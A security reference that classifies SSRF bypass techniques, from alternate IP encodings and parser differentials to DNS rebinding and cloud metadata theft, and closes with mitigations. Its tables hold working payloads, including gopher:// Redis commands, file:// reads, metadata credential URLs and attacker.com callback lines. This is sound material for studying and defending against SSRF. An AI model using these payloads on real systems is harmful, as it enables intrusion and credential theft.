# Server-Side Request Forgery (SSRF) Mutation/Variation Taxonomy

*Comprehensive classification of SSRF bypass techniques, attack vectors, and exploitation chains — organized by structural mutation target.*

---

## Classification Structure

This taxonomy classifies SSRF mutations along three orthogonal axes:

**Axis 1 — Mutation Target (Primary Structure):** The structural component of the URL, request, or resolution process being manipulated. This axis organizes the main body of the document into eight top-level categories (§1–§8), each targeting a distinct component of the request lifecycle — from IP representation through DNS resolution to protocol handlers.

**Axis 2 — Bypass Type (Cross-Cutting):** The nature of the defense mechanism being defeated. Each mutation technique achieves one or more of these bypass effects:

| Bypass Type | Description |
|---|---|
| **Blocklist Bypass** | Evades filters that deny specific IPs, hostnames, or schemes |
| **Allowlist Bypass** | Tricks filters that permit only specific domains/IPs |
| **Parser Differential** | Exploits inconsistency between the URL parser (validator) and the URL requester |
| **TOCTOU** | Time-of-check vs. time-of-use race condition (e.g., DNS rebinding) |
| **Protocol Confusion** | Leverages unexpected protocol handlers to reach internal services |
| **Blind / OOB** | Exfiltrates data or confirms reachability without direct response visibility |

**Axis 3 — Attack Scenario (Impact Mapping):** The deployment context where the mutation is weaponized (§9). Cloud metadata theft, internal API access, local file read, port scanning, and RCE chains each require specific mutation combinations.

### Fundamental Mechanism

SSRF exploits a trust boundary violation: the server-side application acts as a *proxy* for attacker-controlled input, making requests with the server's network identity and privileges. Every mutation in this taxonomy targets the gap between **what the validator sees** and **what the requester fetches**.

---

## §1. IP Address Representation Mutations

The most fundamental SSRF bypass category. IP address filters typically match against a canonical dotted-decimal form (e.g., `127.0.0.1`), but the TCP/IP stack accepts many alternative representations that resolve identically.

### §1-1. Numeric Base Encoding

Standard IP validation expects dotted-decimal notation. However, most operating systems and URL libraries accept decimal, octal, and hexadecimal integer representations.

| Subtype | Mechanism | Example Payload | Key Condition |
|---|---|---|---|
| **Decimal (DWORD)** | Entire IPv4 address as a single 32-bit unsigned integer | `http://2130706433/` (= 127.0.0.1) | OS/library accepts integer IPs |
| **Hexadecimal** | Hex-encoded IP, with or without dotted notation | `http://0x7f000001/` or `http://0x7f.0x00.0x00.0x01/` | Parser accepts `0x` prefix |
| **Octal** | Leading-zero notation triggers octal interpretation | `http://0177.0000.0000.0001/` or `http://017700000001/` | Parser interprets leading `0` as octal |
| **Mixed-base** | Combine decimal, octal, and hex in different octets | `http://0x7f.0.0.0x01/` | Parser processes each octet independently |
| **Overflow DWORD** | Add multiples of 2^32 to the integer representation | `http://45080379393/` (= 2130706433 + 10×2^32) | Library truncates to 32-bit without error |

### §1-2. Shortened and Zero-Collapsed Forms

IP parsers often accept abbreviated notations where trailing zero octets are omitted.

| Subtype | Mechanism | Example Payload | Key Condition |
|---|---|---|---|
| **Shortened localhost** | Omitting trailing zero octets | `http://127.1/`, `http://127.0.1/` | OS resolves partial dotted notation |
| **Zero address** | Using `0` or `0.0.0.0` as localhost equivalent | `http://0/`, `http://0.0.0.0/` | Application binds to all interfaces |
| **Loopback range** | Any address in `127.0.0.0/8` resolves to loopback | `http://127.127.127.127/`, `http://127.0.0.2/` | Filter only blocks `127.0.0.1` exactly |

### §1-3. IPv6 Representations

IPv6 syntax introduces multiple encoding possibilities and mixed-format notations that many IPv4-focused blocklists miss entirely.

| Subtype | Mechanism | Example Payload | Key Condition |
|---|---|---|---|
| **Standard IPv6 loopback** | `::1` is the IPv6 loopback address | `http://[::1]/`, `http://[0000::1]:80/` | Application listens on IPv6 |
| **IPv6 unspecified** | `[::]` binds to all interfaces, similar to `0.0.0.0` | `http://[::]:80/` | Dual-stack network |
| **IPv4-mapped IPv6** | Embedding IPv4 address inside IPv6 notation | `http://[::ffff:127.0.0.1]/`, `http://[0:0:0:0:0:ffff:7f00:1]/` | Dual-stack parser processes mapped address |
| **IPv6 zone identifier** | RFC 6874 allows zone ID after `%25` in bracketed IPv6 | `http://[fe80::1%25eth0]/`, `http://[fe80::1%25lo]/` | Filter strips brackets but not zone ID |
| **IPv6 with embedded decimal** | Hybrid notation mixing IPv6 and dotted-decimal | `http://[::ffff:169.254.169.254]/` | Parser normalizes to target IPv4 |
| **Expanded zeros** | Fully expanded IPv6 with redundant zeros | `http://[0:0:0:0:0:0:0:1]/` | Regex-based filter expects compressed form |

---

## §2. Hostname and Domain Manipulation

When filters validate against domain names rather than raw IP addresses, the hostname component itself becomes the mutation target.

### §2-1. DNS Wildcard and Redirect Services

Specialized DNS services resolve arbitrary subdomains to attacker-specified IP addresses, turning any IP into a "legitimate" hostname.

| Subtype | Mechanism | Example Payload | Key Condition |
|---|---|---|---|
| **nip.io / sslip.io** | Embeds IP in subdomain; DNS resolves to that IP | `http://127.0.0.1.nip.io/`, `http://169.254.169.254.nip.io/` | Outbound DNS not restricted |
| **xip.io variants** | Base36/hex-encoded IP in subdomain | `http://1ynrnhl.xip.io/` (= 169.254.169.254) | Service operational |
| **localtest.me** | Hardcoded wildcard resolving all subdomains to `127.0.0.1` | `http://anything.localtest.me/` | DNS resolves externally |
| **Custom attacker DNS** | Attacker-controlled DNS zone returning internal IPs | `http://internal.attacker.com/` → A record: `10.0.0.1` | No DNS-level validation |

### §2-2. Case and Character Variation

| Subtype | Mechanism | Example Payload | Key Condition |
|---|---|---|---|
| **Case variation** | Mixed case bypasses case-sensitive string matching | `http://LoCaLhOsT/`, `http://LOCALHOST/` | Filter uses case-sensitive comparison |
| **Unicode dots** | Fullwidth or ideographic period replaces ASCII dot | `http://127。0。0。1/` (U+3002), `http://127%E3%80%820%E3%80%820%E3%80%821/` | Parser normalizes Unicode to ASCII |
| **Unicode homoglyphs** | Visually similar characters from different scripts | `http://ⅼⅰnkedin.com/` (using Roman numeral letters) | IDN processing normalizes to target |
| **Circled/enclosed characters** | Unicode enclosed alphanumerics | Various enclosed digit forms for IP octets | Parser decodes to numeric values |

### §2-3. Credential Embedding (@ Notation)

The URL userinfo component (`user:pass@host`) creates ambiguity about which part is the actual hostname.

| Subtype | Mechanism | Example Payload | Key Condition |
|---|---|---|---|
| **Basic @ bypass** | Filter checks prefix; requester resolves after `@` | `http://allowed.com@attacker.com/` | Filter validates text before `@` |
| **Fragment + @ combo** | `#` terminates the URL for the filter; `@` confuses host | `http://allowed.com#@attacker.com/` | Parser disagreement on fragment handling |
| **URL-encoded @** | `%40` decoded after validation | `http://allowed.com%40attacker.com/` | Decoding happens post-validation |
| **Double-encoded @** | `%2540` → `%40` → `@` across two decoding stages | `http://allowed.com%2540attacker.com/` | Multi-stage decoding pipeline |

---

## §3. URL Scheme and Protocol Mutations

When only `http://` and `https://` are considered, alternative protocol schemes provide direct access to internal services through the same SSRF vector.

### §3-1. Native Protocol Handlers

| Subtype | Mechanism | Example Payload | Key Condition |
|---|---|---|---|
| **gopher://** | Sends raw TCP data; can craft arbitrary protocol messages | `gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aSHUTDOWN%0d%0a` | Library supports gopher; target service on TCP |
| **file://** | Reads local filesystem directly | `file:///etc/passwd`, `file:///C:/Windows/win.ini` | Library allows file:// scheme |
| **dict://** | DICT protocol allows single-command interaction | `dict://127.0.0.1:6379/SET:key:value` | Target listens on port; dict:// not filtered |
| **tftp://** | Triggers UDP request; useful for OOB exfiltration | `tftp://attacker.com/file` | Library supports TFTP |
| **ldap://** | LDAP queries against internal directory services | `ldap://127.0.0.1:389/` | LDAP service accessible |
| **jar://** | Java-specific; fetches and processes JAR/ZIP archives | `jar:http://127.0.0.1!/file.txt` | Java runtime processes URLs |

### §3-2. Scheme Obfuscation

| Subtype | Mechanism | Example Payload | Key Condition |
|---|---|---|---|
| **Schemeless with colon** | Omitting `//` confuses scheme extraction | `https:attacker.com`, `http:/attacker.com` | Parser accepts non-standard scheme delimiter |
| **Backslash substitution** | WHATWG spec treats `\` as `/` in scheme delimiter | `http:\\attacker.com`, `http:/\/\attacker.com` | Parser follows WHATWG (browsers); filter follows RFC |
| **Case-varied scheme** | Uppercase scheme name | `FILE:///etc/passwd`, `GOPHER://...` | Scheme matching is case-sensitive |
| **Whitespace injection** | Tabs, newlines, or Unicode spaces within scheme | `http\t://127.0.0.1/` | Parser strips whitespace before resolution |

### §3-3. Protocol Smuggling via Gopher

The `gopher://` protocol deserves special attention as it enables arbitrary TCP protocol interaction, transforming SSRF into command execution against numerous internal services.

| Target Service | Mechanism | Impact |
|---|---|---|
| **Redis** | Craft raw RESP commands via gopher payload | RCE via cron job, SSH key injection, or Lua scripting |
| **Memcached** | Inject cache entries with arbitrary values | Cache poisoning, session hijacking |
| **MySQL** | Send authentication and query packets | Data exfiltration (requires no-password auth) |
| **SMTP** | Craft email messages with arbitrary headers/body | Phishing, spam relay, internal notification abuse |
| **FastCGI** | Send specially crafted FastCGI records | RCE via PHP_VALUE/PHP_ADMIN_VALUE injection |
| **Zabbix Agent** | Send agent protocol commands | Command execution via `system.run` |

---

## §4. URL Encoding and Character-Level Mutations

Encoding transformations are among the most versatile SSRF bypass techniques, exploiting differences in when and how URL components are decoded across the validation and request pipeline.

### §4-1. Percent Encoding

| Subtype | Mechanism | Example Payload | Key Condition |
|---|---|---|---|
| **Single URL encoding** | Standard percent-encoding of blocked characters | `http://127.0.0.1/%61dmin` → `/admin` | Decoded after blocklist check |
| **Double URL encoding** | Encode the `%` itself: `%25XX` | `http://127.0.0.1/%2561dmin` → `%61dmin` → `/admin` | Two-stage decoding pipeline |
| **Triple/N-level encoding** | Recursive encoding for multi-stage pipelines | `%252561` → `%2561` → `%61` → `a` | N decoding stages exist |
| **Selective encoding** | Encode only specific characters to break pattern matching | `http://127%2e0%2e0%2e1/` (encoded dots) | Dot-based parsing happens pre-decode |
| **Full hostname encoding** | Encode the entire hostname | `http://%6c%6f%63%61%6c%68%6f%73%74/` (= localhost) | Decoded before DNS resolution |

### §4-2. Unicode and Normalization

| Subtype | Mechanism | Example Payload | Key Condition |
|---|---|---|---|
| **Zero-width characters** | Invisible Unicode inserted into blocked strings | `local\u200Bhost` (zero-width space) | Stripped during normalization |
| **Soft hyphen** | U+00AD removed during display/normalization | `local\u00ADhost` | Normalization occurs after validation |
| **Line/paragraph separator** | U+2028/U+2029 breaks regex anchors like `^...$` | `allowed.com\u2028attacker.com` | Regex operates per-line |
| **Word joiner** | U+2060 inserted within keywords | `127\u20600.0.1` | Removed during address resolution |
| **NFKC normalization** | Unicode decomposition maps exotic chars to ASCII | `ﬁle:///etc/passwd` (fi ligature → "fi") | Parser applies NFKC before scheme check |
| **Fullwidth characters** | U+FF01–U+FF5E map to ASCII equivalents | `http://１２７．０．０．１/` | NFKC normalization converts fullwidth digits |

### §4-3. Null Byte and Termination Tricks

| Subtype | Mechanism | Example Payload | Key Condition |
|---|---|---|---|
| **Null byte truncation** | `%00` terminates string in C-based parsers | `http://allowed.com%00.attacker.com/` | Validator reads full string; C library truncates at null |
| **Hash fragment truncation** | `#` terminates URL for some parsers | `http://attacker.com#allowed.com` | Filter reads after `#`; requester ignores fragment |

---

## §5. URL Structure and Parser Differential Mutations

This category targets the *structure* of the URL itself — exploiting ambiguity in how different URL parsing libraries split a URL into its components (scheme, authority, userinfo, host, port, path, query, fragment).

### §5-1. Authority Component Confusion

| Subtype | Mechanism | Example Payload | Key Condition |
|---|---|---|---|
| **Backslash-as-separator** | WHATWG treats `\` as path separator; RFC does not | `http://allowed.com\@attacker.com/` | Validator: RFC (no authority split); Requester: WHATWG (splits at `\`) |
| **Tab/newline in authority** | Some parsers ignore whitespace within URL components | `http://127.0.0.1\t.allowed.com/` | Parser strips control characters |
| **Port confusion** | Non-numeric port handling differs across parsers | `http://127.0.0.1:port80/` | Some parsers ignore non-numeric; others error |
| **Missing double-slash** | `http:host` vs `http://host` parsing inconsistency | `http:169.254.169.254` | Some parsers accept single-slash scheme |

### §5-2. Path and Query Confusion

| Subtype | Mechanism | Example Payload | Key Condition |
|---|---|---|---|
| **Path traversal in URL** | Dot-segments resolve after validation | `http://allowed.com/..%2f..%2f127.0.0.1/` | Path normalization differs between validator and requester |
| **Semicolon as parameter delimiter** | Some frameworks treat `;` as path parameter | `http://allowed.com;@attacker.com/` | Framework-specific path parsing |
| **Query string as host** | Malformed URL where query absorbs host component | `http://allowed.com?@attacker.com/` | Parser ambiguity on `?` position |

### §5-3. Library-Specific Parser Differentials

Different programming language URL libraries disagree on how to parse identical URLs. The gap between what the *validator* library sees and what the *requester* library fetches is the root cause of many SSRF bypasses.

| Differential | Mechanism | Key Condition |
|---|---|---|
| **Python urllib vs. urllib3** | `urllib` sees no netloc; `urllib3` falls back to adding default protocol and resolving | Validation with `urllib.parse`, request with `urllib3` or `requests` |
| **Java URL vs. URI** | `java.net.URL.getHost()` and `java.net.URI.getHost()` return different results for identical input | Validation uses one class; request uses another |
| **PHP parse_url vs. cURL** | `parse_url()` host extraction differs from libcurl's resolution | `parse_url` validates; cURL fetches |
| **Node.js URL vs. legacy url** | WHATWG `URL` and legacy `url.parse()` disagree on backslash, @, and fragment handling | Mixed usage in validation + request chain |
| **Ruby URI vs. Addressable** | Gem-level parsing differences | Library version mismatch |
| **Spring Framework** | CVE-2024-22243: square brackets in userinfo bypass host validation | Spring URL validation in SSRF-prone endpoints |

---

## §6. DNS Resolution Mutations

Rather than mutating the URL string itself, these techniques exploit the DNS resolution process — the step between hostname validation and actual TCP connection.

### §6-1. DNS Rebinding

The canonical TOCTOU attack against SSRF: the hostname resolves to different IPs at validation time vs. request time.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Classic DNS rebinding** | Attacker DNS server returns allowed IP first (passes validation), then internal IP on second query | Short TTL; application performs separate validation and request DNS queries |
| **Race-condition rebinding** | DNS server alternates between allowed and internal IPs; attacker retries until the race is won | Low TTL (0 or 1 second); no DNS caching |
| **Dual-A-record rebinding** | Return both allowed and internal IPs in a single DNS response; OS/library may select either | OS resolver selection behavior is non-deterministic |
| **DNS rebinding via service workers** | Browser-based SSRF where service worker caches the "good" resolution | Browser-based SSRF context |

Tools: `rbndr.us`, Singularity of Origin, Tavis Ormandy's DNS rebinding tool, and custom authoritative DNS servers with TTL=0 are used to automate these attacks.

**Real-world example:** In 2024, a researcher bypassed Azure DevOps SSRF mitigations using DNS rebinding to access the metadata API ($5,000 Microsoft bounty).

### §6-2. DNS Pinning Bypass

Even when applications "pin" the resolved IP after the first lookup, bypasses exist.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **TTL-respecting caching** | Application caches DNS but respects TTL; attacker sets TTL=0 | Application honors TTL from DNS response |
| **Connection pool exhaustion** | Force new connections that trigger fresh DNS resolution | High-concurrency or connection timeout settings |
| **Multi-step request flows** | First request resolves legitimately; subsequent redirect triggers re-resolution | Application follows redirects with fresh lookups |

### §6-3. DNS Alias and CNAME Tricks

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **CNAME to internal** | External domain with CNAME pointing to internal hostname | Internal DNS resolves the CNAME target |
| **DNS alias chaining** | Multiple CNAME hops eventually resolving to internal IP | Recursive resolution follows full chain |
| **Wildcard DNS zones** | `*.attacker.com` resolves everything to a target IP | Convenient for automated exploitation |

---

## §7. Redirect and Request Chain Mutations

These techniques bypass validation at the *initial request* stage but exploit the application's behavior when following HTTP redirects or processing response content.

### §7-1. HTTP Redirect Chains

| Subtype | Mechanism | Example | Key Condition |
|---|---|---|---|
| **302/303 redirect** | Validation passes on initial URL; redirect points to internal resource | `http://attacker.com/redir` → 302 → `http://169.254.169.254/` | Application follows redirects; re-validation absent |
| **307/308 redirect** | Preserves HTTP method and body through redirect | `POST http://attacker.com/redir` → 307 → `POST http://internal/api` | POST-based SSRF needs method preservation |
| **Protocol-switching redirect** | Redirect from HTTPS to HTTP, or from HTTP to gopher/file | `https://attacker.com/` → 302 → `gopher://127.0.0.1:6379/...` | Scheme not re-validated after redirect |
| **Redirect chain via open redirect** | Leverage an open redirect on an allowed domain | `http://allowed.com/redirect?url=http://169.254.169.254/` | Allowed domain has open redirect vulnerability |
| **Meta refresh / JavaScript redirect** | HTML-level redirect in response body | `<meta http-equiv="refresh" content="0;url=http://internal/">` | Headless browser renders response |
| **Multiple-hop chain** | Chain through several redirects to evade per-hop checks | `A → B → C → internal` | Each hop passes individual validation |

### §7-2. Injection Points (Entry Vectors)

SSRF doesn't always come from an obvious "URL" parameter. Diverse application features accept URLs or hostnames that the server subsequently requests.

| Entry Vector | Mechanism | Example |
|---|---|---|
| **Webhook URLs** | Application sends callbacks to user-specified URLs | Webhook configuration in CI/CD, payment, or notification systems |
| **PDF/Image generation** | Server-side rendering fetches embedded resources | HTML with `<img src="http://internal/">` or `<link href="...">` in PDF template |
| **SVG processing** | SVG files can embed external resources via `<image>`, `<use>`, `<foreignObject>` | `<svg><image href="http://169.254.169.254/"/>` in uploaded SVG |
| **XML/XXE** | External entity resolution fetches arbitrary URLs | `<!ENTITY xxe SYSTEM "http://169.254.169.254/">` in XML input |
| **Import/fetch features** | "Import from URL" functionality (RSS, OPML, CSV, etc.) | URL-based import in CMS, spreadsheet, or feed reader |
| **Headless browser rendering** | Server-side browser navigates to user URL; JavaScript executes | Screenshot services, link preview generators, prerender engines |
| **OAuth/OpenID callbacks** | Attacker-controlled redirect_uri or issuer URL | Modified OpenID configuration endpoint pointing to internal |
| **Image/file URL parameters** | Profile picture URL, avatar URL, file preview | `?avatar_url=http://169.254.169.254/` |
| **API integrations** | Endpoint URL fields in third-party service configuration | Slack incoming webhook URL, API base URL configuration |
| **LLM/AI tool use** | AI agents fetching URLs from user prompts | "Summarize this article: http://169.254.169.254/" fed to an LLM with web access |

### §7-3. Blind SSRF and Out-of-Band Techniques

When the server's response is not returned to the attacker, blind SSRF requires indirect methods to confirm reachability and exfiltrate data.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **DNS-based OOB** | Force DNS lookup to attacker-controlled nameserver | Outbound DNS not blocked; Burp Collaborator / interactsh available |
| **HTTP callback** | Trigger HTTP request to attacker server | Outbound HTTP not blocked |
| **Timing-based inference** | Measure response time differences for reachable vs. unreachable hosts | Consistent timing behavior |
| **Error-based inference** | Different HTTP status codes or error messages reveal reachability | Verbose error responses |
| **Response size inference** | Content-length differences indicate different internal responses | Side-channel observable |
| **SSRF canary chaining** | Blind SSRF hits internal service that makes external callback | Internal service has outbound capability |

---

## §8. Cloud Metadata Service Exploitation

Cloud metadata services represent the highest-impact SSRF target in modern infrastructure. Each cloud provider exposes instance metadata at well-known link-local addresses.

### §8-1. AWS Metadata Service

| Target Endpoint | Data Exposed | Key Condition |
|---|---|---|
| `http://169.254.169.254/latest/meta-data/` | Instance metadata, network config, AMI details | IMDSv1 enabled (no token required) |
| `http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}` | Temporary IAM access keys (AccessKeyId, SecretAccessKey, Token) | IAM role attached to instance |
| `http://169.254.169.254/latest/user-data/` | Instance bootstrap scripts (often contain secrets) | User data populated |
| `http://169.254.169.254/latest/api/token` (PUT) | IMDSv2 session token | IMDSv2 requires PUT with custom header; simple SSRF cannot reach |

**IMDSv2 bypass:** Requires HTTP header injection (via request smuggling/splitting) to inject `X-aws-ec2-metadata-token-ttl-seconds` header in the PUT request. Simple SSRF alone cannot bypass IMDSv2.

### §8-2. Azure Metadata Service

| Target Endpoint | Data Exposed | Key Condition |
|---|---|---|
| `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | VM configuration, network, tags | Requires `Metadata: true` header |
| `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/` | Managed identity OAuth token | Managed identity assigned |

**Header requirement:** Azure IMDS requires `Metadata: true` header. Bypass requires header injection capability (§5 parser differentials or request smuggling). CVE-2025-53767 (Azure OpenAI, CVSS 10.0) demonstrated catastrophic metadata exposure via insufficient URL validation.

### §8-3. GCP Metadata Service

| Target Endpoint | Data Exposed | Key Condition |
|---|---|---|
| `http://metadata.google.internal/computeMetadata/v1/` | Instance metadata, project metadata | Requires `Metadata-Flavor: Google` header |
| `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` | OAuth2 access token for attached service account | Service account attached |

**Note:** GCP uses hostname-based access (`metadata.google.internal`) rather than raw IP, though `169.254.169.254` also works. Header requirement provides similar protection as Azure.

### §8-4. Oracle Cloud Infrastructure (OCI)

| Target Endpoint | Data Exposed | Key Condition |
|---|---|---|
| `http://169.254.169.254/opc/v1/identity/` | Instance identity, certificates | No header requirement (v1) |
| `http://169.254.169.254/opc/v2/identity/` | Same, with authorization header | Requires `Authorization: Bearer Oracle` |
| `http://169.254.169.254/opc/v1/instance/` | Instance metadata, compartment OCID | No header requirement (v1) |

### §8-5. Metadata IP Representation Bypass

All cloud providers use `169.254.169.254` as the metadata endpoint. This IP can be represented using all techniques from §1:

| Representation | Payload |
|---|---|
| Decimal | `http://2852039166/` |
| Hexadecimal | `http://0xa9fea9fe/` |
| Octal | `http://0251.0376.0251.0376/` |
| IPv6-mapped | `http://[::ffff:169.254.169.254]/` |
| nip.io | `http://169.254.169.254.nip.io/` |
| Shortened | `http://169.254.43518/` (last two octets as 16-bit) |

---

## §9. Attack Scenario Mapping (Axis 3)

| Scenario | Architecture | Primary Mutation Categories | Typical Impact |
|---|---|---|---|
| **Cloud credential theft** | Any cloud-hosted application with SSRF | §1 + §4 + §8 (IP mutations to reach metadata) | Full account compromise via IAM keys |
| **Internal API access** | Microservices with internal-only endpoints | §1 + §2 + §6 (hostname/DNS tricks) | Data exfiltration, privilege escalation |
| **Local file read** | Application with file:// support | §3-1 (file:// scheme) | Source code, configuration, credentials |
| **Internal port/service scanning** | Any SSRF with observable response differences | §7-3 (blind SSRF timing/error inference) | Network reconnaissance |
| **RCE via protocol smuggling** | Internal Redis, Memcached, FastCGI reachable | §3-3 (gopher → service exploitation) | Remote code execution |
| **Cache poisoning** | Shared caching layer (CDN, reverse proxy) | §7-1 (redirect chains) + §2 | Serve malicious content to other users |
| **Webhook abuse** | CI/CD, payment, notification systems | §7-2 (injection via webhook URLs) | Trigger unauthorized actions |
| **LLM infrastructure hijacking** | AI applications with URL-fetching agents | §7-2 (LLM tool use) + §1 | Credential theft, model abuse |
| **PDF/rendering exploitation** | Server-side HTML-to-PDF engines | §7-2 (PDF/SVG entry vectors) | File read, SSRF to internal services |

---

## §10. CVE / Bounty Mapping (2023–2025)

| Mutation Combination | CVE / Case | Impact / Bounty |
|---|---|---|
| §5-3 + §8-2 | **CVE-2025-53767** (Azure OpenAI) | CVSS 10.0. Managed identity token exfiltration via insufficient URL validation |
| §5-3 + §8-1 | **CVE-2025-57822** (Next.js) | SSRF via resolve-routes; internal resource access with user-controlled headers |
| §4-3 + §2 | **CVE-2025-1220** (PHP) | Null byte in hostname via `fsockopen()` bypasses access checks |
| §5-3 | **CVE-2024-22243** (Spring Framework) | Square brackets in userinfo bypass host validation |
| §5-1 | **CVE-2024-22329** (WebSphere) | SSRF via improper URL validation in traditional WAS |
| §3-2 + §5-1 | **CVE-2024-38472** (Apache httpd) | UNC SSRF on Windows via mod_rewrite. $4,920 bounty |
| §7-1 + §3-2 | **CVE-2024-40898** (Apache httpd) | SSRF through mod_rewrite in server/vhost context. $4,263 bounty |
| §5-3 | **CVE-2023-27592** (Miniflux) | Backslash confusion: `http://example.com\\@169.254.169.254/` |
| §6-1 + §8-2 | **Azure DevOps SSRF (2024)** | DNS rebinding to metadata API. $5,000 Microsoft bounty |
| §8-1 + §1 | **Capital One breach (2019)** | AWS metadata exfiltration via SSRF. $80M+ in damages. Landmark case |
| §7-1 + §8-1 | **Shopify SSRF (HackerOne)** | 303 redirect bypass to cloud metadata. Significant bounty |
| §8-1 + §1 | **EC2 IMDS campaign (March 2025)** | Systematic targeting of EC2 instances via SSRF for IAM credential theft |
| §7-2 + §8 | **Oracle EBS CVE-2025-61882** | Weaponized by Cl0p ransomware; CISA KEV. Fortune 500 impact |

---

## §11. Detection and Exploitation Tools

### Offensive Tools

| Tool | Target Scope | Core Technique |
|---|---|---|
| **SSRFmap** | Automated SSRF exploitation | Fuzzes parameters with protocol-specific payloads (gopher, file, etc.); integrates with Burp |
| **Gopherus** | Gopher payload generation | Generates gopher:// payloads for Redis, MySQL, FastCGI, SMTP, etc. |
| **SSRF-Scanner** | Comprehensive SSRF testing | 10 attack phases, ~28,300 requests, concurrent scanning, callback support |
| **Burp Collaborator** | Blind SSRF detection | OOB DNS/HTTP interaction monitoring |
| **interactsh (ProjectDiscovery)** | OOB interaction detection | Open-source Collaborator alternative; DNS, HTTP, SMTP callbacks |
| **Burp-Encode-IP** | IP representation fuzzing | Generates all IP encoding variations automatically |
| **recollapse** | Regex bypass generation | Generates regex-evading URL variations |
| **SSRF-PayloadMaker** | Host mangling | Generates 80,000+ hostname/IP mutation combinations |
| **Singularity of Origin** | DNS rebinding framework | Automated DNS rebinding attack platform |
| **SSRFSeek** | LLM-based SSRF detection | Static analysis using LLM for PHP applications |

### Defensive Tools

| Tool | Target Scope | Core Technique |
|---|---|---|
| **OWASP SSRF Prevention Cheat Sheet** | Reference architecture | Allowlist-first approach, input validation patterns |
| **PortSwigger URL Validation Bypass Cheat Sheet** | URL filter testing | Interactive wordlist generator for bypass testing |
| **AWS IMDSv2** | Cloud metadata protection | Session-token-based metadata access requiring PUT + custom header |
| **Azure/GCP header requirements** | Cloud metadata protection | Mandatory custom headers block simple SSRF |
| **Nuclei (ProjectDiscovery)** | Vulnerability scanning | SSRF-specific templates for automated detection |
| **Ghost Security** | Runtime SSRF prevention | API-level SSRF detection and blocking |

---

## §12. Summary: Core Principles

### The Root Cause

SSRF persists as a vulnerability class because of a fundamental architectural pattern in modern web applications: **servers act as HTTP clients on behalf of user input**. Every feature that accepts a URL, hostname, or address — whether it's a webhook, an image URL, an API integration, or an AI agent's web-browsing capability — creates a potential SSRF entry point. The server's network identity (access to internal networks, cloud metadata, localhost services) becomes the attacker's identity.

### Why Incremental Patches Fail

The mutation space documented in this taxonomy reveals why blocklist-based defenses are structurally insufficient:

1. **Combinatorial explosion:** IP encoding alone produces dozens of representations for a single address (§1). Combined with hostname tricks (§2), encoding layers (§4), and parser differentials (§5), the space of equivalent-but-distinct URLs is effectively unbounded.

2. **Moving target:** New parser inconsistencies, protocol handlers, and cloud service endpoints emerge continuously. Each new programming language, URL library, or cloud provider adds new bypass surfaces.

3. **Semantic gap:** The distance between what a human-readable URL "means" and what a machine resolves it to is fundamentally unbridgeable through pattern matching. DNS rebinding (§6) and redirect chains (§7) demonstrate that even a "correct" URL can become malicious between validation and use.

### Structural Solutions

Effective SSRF mitigation requires defense-in-depth across multiple layers:

- **Network-level isolation:** Deny outbound traffic from application servers to metadata endpoints and internal networks by default (firewall rules, VPC configuration, iptables).
- **DNS resolution pinning:** Resolve the hostname *once*, validate the resulting IP, and use that IP for the actual request — eliminating the TOCTOU window.
- **Allowlist, not blocklist:** Permit only explicitly approved destination hosts/IPs. This inverts the mutation problem: the attacker must match the allowlist rather than evade the blocklist.
- **Cloud metadata hardening:** Enforce IMDSv2 (AWS), require custom headers (Azure/GCP), and disable metadata service access where not needed.
- **Protocol restriction:** Strip non-HTTP(S) schemes before any request. Disable gopher://, file://, dict://, and other protocols at the library level.
- **Redirect control:** Do not follow redirects, or re-validate the destination after each redirect hop.

The 452% increase in SSRF attacks observed in 2024 — driven partly by AI-automated reconnaissance — underscores that this vulnerability class is accelerating, not diminishing. As applications increasingly integrate URL-accepting features (webhooks, AI agents, cloud APIs), the SSRF attack surface will continue to expand.

---

*This document was created for defensive security research and vulnerability understanding purposes.*

---

## References

### Foundational References

- OWASP Top 10 (2021) — A10: Server-Side Request Forgery (SSRF): https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_(SSRF)/
- OWASP SSRF Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
- OWASP SSRF Bible (PDF): https://cheatsheetseries.owasp.org/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf
- OWASP Web Security Testing Guide — Testing for SSRF: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery
- PortSwigger Web Security Academy — SSRF: https://portswigger.net/web-security/ssrf
- PayloadsAllTheThings — Server Side Request Forgery: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md
- HackTricks — SSRF (Server Side Request Forgery): https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery

### Standards and Specifications

- RFC 3986 — Uniform Resource Identifier (URI): Generic Syntax: https://datatracker.ietf.org/doc/html/rfc3986
- RFC 6874 — Representing IPv6 Zone Identifiers in Address Literals and URIs: https://datatracker.ietf.org/doc/html/rfc6874
- WHATWG URL Living Standard: https://url.spec.whatwg.org/

### Seminal Research and Conference Talks

- Orange Tsai — "A New Era of SSRF: Exploiting URL Parser in Trending Programming Languages" (Black Hat USA 2017): https://blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf
- Orange Tsai — How I Chained 4 Vulnerabilities on GitHub Enterprise (SSRF to RCE): https://blog.orange.tw/posts/2017-07-how-i-chained-4-vulnerabilities-on/
- Ben Sadeghipour & Cody Brocious — "Owning the Clout Through SSRF and PDF Generators" (DEF CON 27): https://media.defcon.org/DEF%20CON%2027/DEF%20CON%2027%20presentations/DEFCON-27-Ben-Sadeghipour-Owning-the-clout-through-SSRF-and-PDF-generators.pdf
- Jonathan Birch — "Host/Split: Exploitable Antipatterns in Unicode Normalization" (Black Hat USA 2019): https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization-wp.pdf

### URL Parser Differentials

